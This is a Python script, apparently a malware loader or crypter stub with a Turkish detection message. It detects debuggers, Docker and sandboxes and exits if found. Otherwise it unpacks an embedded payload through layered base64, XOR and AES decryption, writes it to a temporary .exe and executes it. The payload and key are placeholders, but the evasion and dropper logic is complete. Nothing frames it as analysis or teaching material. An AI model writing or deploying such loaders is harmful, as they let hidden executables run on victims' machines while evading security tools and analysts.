import base64
import tempfile
import subprocess
import os
import sys
import platform
from Cryptodome.Cipher import AES
import hashlib


def is_debugger_present():
    try:
        if platform.system() == "Windows":
            import ctypes
            return ctypes.windll.kernel32.IsDebuggerPresent() != 0
        else:
            return os.path.exists("/proc/self/status") and "TracerPid: 0" not in open("/proc/self/status").read()
    except:
        return False

def is_sandbox():
    try:
        if platform.system() == "Linux":
            if os.path.exists("/.dockerenv") or os.path.exists("/proc/self/cgroup"):
                return True
        if platform.system() == "Windows":
            import ctypes
            if ctypes.windll.kernel32.GetTickCount() < 10000:
                return True
        return False
    except:
        return False

if is_debugger_present() or sys.gettrace() or is_sandbox():
    print("Debugger veya sandbox tespit edildi")
    sys.exit()

def xor_decrypt(data, key):
    return bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])

def aes_decrypt(data, key):
    nonce, tag, ciphertext = data[:16], data[16:32], data[32:]
    cipher = AES.new(hashlib.sha256(key).digest(), AES.MODE_EAX, nonce=nonce)
    return cipher.decrypt_and_verify(ciphertext, tag)

def multi_layer_base64_decode(data, layers=5):
    for _ in range(layers):
        data = base64.b64decode(data)
    return data

encoded_payload = b"#<BASE64>"
key_bytes = base64.b64decode(b"#<KEY>")
decrypted_data = aes_decrypt(xor_decrypt(multi_layer_base64_decode(encoded_payload), key_bytes), key_bytes)

with tempfile.NamedTemporaryFile(delete=False, suffix=".exe") as temp_file:
    temp_file.write(decrypted_data)
    temp_file.flush()
    subprocess.Popen(temp_file.name, shell=True)
